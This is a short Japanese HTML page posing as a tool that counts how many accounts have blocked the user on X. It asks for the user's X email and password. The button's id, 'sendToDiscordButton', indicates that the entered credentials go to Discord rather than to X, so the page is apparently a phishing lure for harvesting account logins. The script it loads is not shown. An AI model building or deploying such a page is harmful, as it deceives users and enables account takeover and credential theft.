!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ブロック確認ツール</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        
        <h1 class="main-title">ブロックされた数を確認するツールです。</h1> 

        <div class="form-group">
            
            <label for="emailInput" class="input-label">メールアドレスを入力</label>
            <input type="text" id="emailInput" class="text-input" placeholder="メールアドレス">
        </div>

        <div class="form-group">
            
            <label for="passwordInput" class="input-label">パスワードを入力</label>
            <input type="password" id="passwordInput" class="text-input" placeholder="パスワード">
        </div>

        <button id="sendToDiscordButton" class="submit-button">Xにログインして確認する</button>
    </div>

    <script src="script.js"></script>
</body>
</html>
